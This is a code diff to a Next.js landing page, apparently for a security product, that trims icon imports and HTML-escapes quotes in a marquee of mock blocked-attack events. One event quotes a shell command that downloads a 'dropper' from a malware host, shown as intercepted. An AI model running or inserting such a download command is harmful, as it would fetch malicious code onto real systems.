@@ -1,7 +1,7 @@
 import Link from "next/link";
 import {
   ArrowRight, Shield, Globe, Activity, Lock,
-  Crosshair, Terminal, Brain, Fingerprint, Cpu, Zap,
+  Crosshair, Terminal, Brain, Zap,
   ChevronRight, ShieldCheck, Server, Database, MonitorDot,
 } from "lucide-react";
 import type { Metadata } from "next";
@@ -135,7 +135,7 @@ export default function LandingPage() {
                 <div className="animate-marquee flex gap-12 text-slate-400">
                   <span>[BLOCKED] SSH credential brute-force from 185.220.101.4 (NL) - T1110</span>
                   <span>•</span>
-                  <span>[INTERCEPTED] Shell command "wget http://malware.io/dropper" - T1105</span>
+                  <span>[INTERCEPTED] Shell command &quot;wget http://malware.io/dropper&quot; - T1105</span>
                   <span>•</span>
                   <span>[BLOCKED] Attacker IP 203.89.9.15 (SG) - active firewall block enforced</span>
                   <span>•</span>
@@ -143,7 +143,7 @@ export default function LandingPage() {
                   <span>•</span>
                   <span>[BLOCKED] SSH credential brute-force from 185.220.101.4 (NL) - T1110</span>
                   <span>•</span>
-                  <span>[INTERCEPTED] Shell command "wget http://malware.io/dropper" - T1105</span>
+                  <span>[INTERCEPTED] Shell command &quot;wget http://malware.io/dropper&quot; - T1105</span>
                   <span>•</span>
                   <span>[BLOCKED] Attacker IP 203.89.9.15 (SG) - active firewall block enforced</span>
                   <span>•</span>
